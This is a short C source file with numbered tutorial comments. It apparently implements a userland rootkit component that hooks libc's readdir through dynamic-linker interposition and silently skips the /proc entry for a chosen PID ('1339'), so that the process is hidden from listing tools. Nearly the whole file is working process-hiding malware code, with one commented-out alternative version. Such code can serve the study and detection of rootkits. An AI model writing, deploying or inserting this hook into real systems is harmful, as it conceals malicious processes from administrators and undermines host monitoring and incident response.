/*
1. Static global function pointer (initially to nul) of a orig_readir function with the same signature as readir 
2. Define a readdir function following the original specification 
3. First time readdir function is invoked we should initialize the orig_readdir function pointer to the original readir function.
	Dynamic loading function symbol resolution (dlsym)
4. Invoke orig_readdir as it was legitimate
5. Check given process name, if the process name is the process we want to hide, iterate again to the next dir entry and return.
		
*/
#define _GNU_SOURCE

#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

#define HIDE_PID "1339"
/**
* 1. Static global function pointer (initially to nul) of a orig_readir function with the same signature as readir  
*/
/*
Same:
typedef struct dirent* (*orig_readdir_t)(DIR *);
orig_readdir_t orig_readdir=NULL;
*/

static struct dirent* (*orig_readdir)(DIR*)=NULL;


/**
* 2. Define a readdir function following the original specification
*/
struct dirent *readdir(DIR *dirp) {
	struct dirent *result;
/**
* 3. First time readdir is invoked initialize orig_readdir to original function using dlsym
*/
	if (orig_readdir==NULL) {
		orig_readdir=dlsym(RTLD_NEXT,"readdir");
		if (orig_readdir==NULL) {
			//dlsym error.
		}
	}
	
/**
* 4. Call orig_readdir function
*/
	while(result=orig_readdir(dirp)) {
		if (result) { //It can be null Needed so it does not blow everything Up.
/**
* 5. Check the given process name, if process name is the one we want to hide, iterate again to next dir Entry and return it.
*/
			if (strcmp(result->d_name,HIDE_PID) ==0) {
				continue;
			}
			break;
		}
	}
	return result;
 /*Implementation without loop
	result=orig_readdir(dirp);
	if (result) {
		if (strcmp(result->d_name,HIDE_PID)==0) {
			result=orig_readdir(dirp);
		}
	}
	return result;*/

}
